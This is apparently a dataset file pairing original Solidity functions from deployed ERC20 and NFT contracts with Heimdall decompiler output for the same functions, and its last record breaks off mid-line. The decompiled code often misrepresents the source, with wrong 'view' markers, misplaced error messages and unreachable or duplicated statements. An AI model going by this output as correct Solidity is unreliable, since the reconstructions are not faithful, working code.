{"contract_address": "0xB44A4AEbE8Fa44847a517Fe02d8dAf36Ab5487f5", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        uint256 currentAllowance = allowance(owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            _approve(owner, spender, currentAllowance - subtractedValue);\\n        }\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function setBreakdown(uint256 _liquidityFee, uint256 _stakingFee, uint256 _marketingFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) external onlyOwner {\r\n        liquidityFee = _liquidityFee;\r\n        stakingFee = _stakingFee;\r\n        marketingFee = _marketingFee;\r\n        devFee = _devFee;\r\n        burnFee = _burnFee;\r\n        totalFee = _liquidityFee.add(_stakingFee).add(_marketingFee).add(_devFee).add(_burnFee);\r\n        feeDenominator = _feeDenominator;\r\n        require(totalFee < feeDenominator / 2, \"Fees can not be more than 10%\"); \r\n        set_fees();\r\n    }", "heimdall_decompiled_code": "function setBreakdown(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5) public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_i = arg0;\n        store_j = arg1;\n        store_k = arg2;\n        store_l = arg3;\n        store_m = arg4;\n        require(!(arg0 > (arg1 + arg0)), \"SafeMath: addition overflow\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!((arg1 + arg0) < arg0), \"SafeMath: addition overflow\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n    }"}
{"contract_address": "0x916c9A0556A89B324b8f1724330a9165C93311A9", "original_solidity_code": "function TransferOwnershipForever(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnershipForever(newOwner);\r\n    }", "heimdall_decompiled_code": "function TransferOwnershipForever(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB2C8e6f566C64A20DE49B25553C312a050de52A3", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2b16EE33D8A9818d8B11fD3400916c824EAa7De9", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x61b34D8c15305c8536D730C2CFF0Ba4006B7Fe67", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x513D675cA0b1EE3A79B055F18D3D8Ea18F07F9aA", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xB1fA6eb9B56F1dC8967969e17734Ba37ddA77E86", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool){\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        require(arg1, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(tradingActive)), \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_d[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_d[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_d[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_d[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_d[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_d[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x1f;\n        require(bytes1(storage_map_d[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x21;\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(arg1 & (sellTotalFees > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x21;\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(lastLpBurnTimef > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_d[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_d[var_a] = storage_map_d[var_a] - 0;\n        var_a = address(this);\n        require(!(storage_map_d[var_a] > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_d[var_a] = storage_map_d[var_a] + 0;\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!(arg1 < 0), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(owner / 0x010000000000000000000000000000000000000000)), \"ERC20: transfer from the zero address\");\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x21;\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer from the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x21;\n        require(!(bytes1(storage_map_d[var_a])), \"ERC20: transfer from the zero address\");\n        require(!(lastLpBurnTimef > 0), \"ERC20: transfer from the zero address\");\n        require(!0, \"ERC20: transfer from the zero address\");\n        require(!(arg1 < 0), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: transfer from the zero address\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        lastLpBurnTime = block.timestamp;\n        var_d = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_e = 0x3598022a221df187dc56927a9a0dc31ca9ab9201;\n        (bool success, bytes memory ret0) = address(this).Unresolved_70a08231(var_e); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!(((var_i + ret0.length) - var_i) < 0x20), \"ERC20: transfer from the zero address\");\n        require(!(var_i.length & (percentForLPBurn > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / var_i.length))), \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(0x2710, \"ERC20: transfer from the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!((var_i.length * percentForLPBurn) / 0x2710), \"ERC20: transfer from the zero address\");\n        require(0x3598022a221df187dc56927a9a0dc31ca9ab9201, \"ERC20: transfer from the zero address\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_k = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_k = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x3598022a221df187dc56927a9a0dc31ca9ab9201;\n        var_b = 0;\n        require(!(storage_map_d[var_a] < ((var_i.length * percentForLPBurn) / 0x2710)), \"ERC20: transfer amount exceeds balance\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x26;\n        var_h = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_k = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = 0x3598022a221df187dc56927a9a0dc31ca9ab9201;\n        var_b = 0;\n        storage_map_d[var_a] = storage_map_d[var_a] - ((var_i.length * percentForLPBurn) / 0x2710);\n        var_a = 0xdead;\n        require(!storage_map_d[var_a] > (~((var_i.length * percentForLPBurn) / 0x2710)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        storage_map_d[var_a] = storage_map_d[var_a] + ((var_i.length * percentForLPBurn) / 0x2710);\n        uint256 var_j = (var_i.length * percentForLPBurn) / 0x2710;\n        emit Transfer(0x3598022a221df187dc56927a9a0dc31ca9ab9201, 0xdead, (var_i.length * percentForLPBurn) / 0x2710);\n        var_j = 0xfff6cae900000000000000000000000000000000000000000000000000000000;\n        require(address(0x3598022a221df187dc56927a9a0dc31ca9ab9201).code.length);\n        (bool success, bytes memory ret0) = address(0x3598022a221df187dc56927a9a0dc31ca9ab9201).{ value: var_b ether }sync(var_f); // call\n        if (!lpBurnEnabled) {\n            if (!lpBurnEnabled) {\n                if (!lpBurnEnabled) {\n                }\n            }\n        }\n        var_a = address(arg0);\n        var_b = 0x21;\n        if (!storage_map_d[var_a]) {\n        }\n        if (!tradingActive / 0x010000) {\n            if (!tradingActive / 0x010000) {\n                if (!tradingActive / 0x010000) {\n                    if (!tradingActive / 0x010000) {\n                        if (!tradingActive / 0x010000) {\n                        }\n                    }\n                }\n            }\n        }\n        if (tradingActive / 0x0100) {\n            require(bytes1(tradingActive / 0x0100), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(bytes1(transferDelayEnabled)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(address(owner) == (address(arg0)), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            require(!(!(address(arg0)) == 0x7a250d5630b4cf539739df2c5dacb4c659f2488d), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x21;\n            require(!(!(address(arg0)) == 0x7a250d5630b4cf539739df2c5dacb4c659f2488d), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x20;\n            require(!(bytes1(storage_map_d[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x21;\n            require(!(!bytes1(storage_map_d[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x20;\n            require(!(bytes1(storage_map_d[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n            var_a = address(arg0);\n            var_b = 0x20;\n            require(!(!bytes1(storage_map_d[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        }\n        require(!(arg1 > lastLpBurnTimed), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x36;\n        var_g = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_h = 0x206d61785472616e73616374696f6e416d6f756e742e00000000000000000000;\n        if (!storage_map_d[var_a]) {\n        }\n        require(!(arg1 > lastLpBurnTimed), \"Buy transfer amount exceeds the maxTransactionAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x35;\n        var_g = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_h = 0x6d61785472616e73616374696f6e416d6f756e742e0000000000000000000000;\n        if (!storage_map_d[var_a]) {\n        }\n        var_a = tx.origin;\n        var_b = 0x12;\n        require(block.number > storage_map_d[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x49;\n        var_g = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_h = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_k = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        if (address(owner) == (address(arg0))) {\n            if (address(owner) == (address(arg0))) {\n            }\n        }\n        var_a = address(msg.sender);\n        var_b = 0x1f;\n        require(bytes1(storage_map_d[var_a]), \"Trading is not active.\");\n        require(bytes1(storage_map_d[var_a]), \"Trading is not active.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x16;\n        var_g = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x30D964B2C1860aeA10abF6aE7C40cB98EE1D2a81", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_f) {\n            if (store_f - ((store_f / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_f / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_f / 0x02;\n                if (store_f) {\n                    if (store_f - ((store_f / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_f / 0x02) {\n                            if (0x1f < (store_f / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_f / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function openTrading() external onlyOwner {\r\n        launchedAt = block.number;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        launchedAt = block.number;\n        tradingOpen = 0x0100000000000000000000000000000000000000000000 | (uint248(tradingOpen));\n    }"}
{"contract_address": "0x8d2d07f485Ea0cEf2E843b1EEE5F2237e8e9d013", "original_solidity_code": "function updateMaxTxnAmount(uint256 txNum, uint256 walNum) external onlyOwner {\r\n        require(txNum >= 1, \"Cannot set maxTransactionAmount lower than 1%\");\r\n        maxTransactionAmount = (totalSupply() * txNum / 100)/1e18;\r\n        require(walNum >= 1, \"Cannot set maxWallet lower than 1%\");\r\n        maxWallet = (totalSupply() * walNum / 100)/1e18;\r\n    }", "heimdall_decompiled_code": "function updateMaxTxnAmount(uint256 arg0, uint256 arg1) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(arg0 < 0x01), \"Cannot set maxTransactionAmount lower than 1%\");\n        require((arg0 == ((arg0 * totalSupply) / totalSupply)) | !totalSupply, \"Cannot set maxTransactionAmount lower than 1%\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x64, \"Cannot set maxTransactionAmount lower than 1%\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2d;\n        var_d = 0x43616e6e6f7420736574206d61785472616e73616374696f6e416d6f756e7420;\n        var_g = 0x6c6f776572207468616e20312500000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function guaranteedWhitelistMint(uint256 quantity) public payable nonReentrant {\\r\\n        require(\\r\\n            block.timestamp >= guaranteedWhitelistInfo.START_TIME &&\\r\\n            block.timestamp <= guaranteedWhitelistInfo.END_TIME,\\r\\n            \\\"Guaranteed whitelist minting closed\\\"\\r\\n        );\\r\\n        require(guaranteedWhitelistInfo.CURR_MINTED < guaranteedWhitelistInfo.SUPPLY, \\\"Sold Out\\\");\\r\\n        require(GUARANTEED_WHITELIST_ADDRESSES[msg.sender], \\\"Not on the guaranteed whitelist\\\");\\r\\n        require(GUARANTEED_WHITELIST_CLAIMED[msg.sender] > 0, \\\"Claimed all avaliable times\\\");\\r\\n        require(quantity <= guaranteedWhitelistInfo.LIMIT_PER_ADDRESS, \\\"Exceeded limit\\\");\\r\\n        require(msg.value == guaranteedWhitelistInfo.PRICE * quantity, \\\"Incorrect amount\\\");\\r\\n\\r\\n        _internalMint(msg.sender, quantity);\\r\\n        guaranteedWhitelistInfo.CURR_MINTED += quantity;\\r\\n        GUARANTEED_WHITELIST_CLAIMED[msg.sender] -= 1; \\r\\n    }", "heimdall_decompiled_code": "function guaranteedWhitelistMint(uint256 arg0) public payable {\n        require(!(ownerg == 0x02), \"ReentrancyGuard: reentrant call\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1f;\n        var_d = 0x5265656e7472616e637947756172643a207265656e7472616e742063616c6c00;\n        ownerg = 0x02;\n        require(block.timestamp < ownera, \"Guaranteed whitelist minting closed\");\n        require(!(block.timestamp < ownera), \"Guaranteed whitelist minting closed\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x47756172616e746565642077686974656c697374206d696e74696e6720636c6f;\n        var_e = 0x7365640000000000000000000000000000000000000000000000000000000000;\n        require(getGuaranteedWhitelistNumMinted < getGuaranteedWhitelistSupply, \"Exceeded limit\");\n        address var_f = msg.sender;\n        var_g = 0x1a;\n        require(bytes1(storage_map_ah[var_f]), \"Exceeded limit\");\n        var_f = msg.sender;\n        var_g = 0x1b;\n        require(storage_map_ah[var_f], \"Exceeded limit\");\n        require(!(arg0 > getGuaranteedWhitelistLimit), \"Exceeded limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0e;\n        var_d = 0x4578636565646564206c696d6974000000000000000000000000000000000000;\n        require(!(getGuaranteedWhitelistPrice & (arg0 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / getGuaranteedWhitelistPrice))), \"Incorrect amount\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(msg.value == (getGuaranteedWhitelistPrice * arg0), \"Incorrect amount\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n     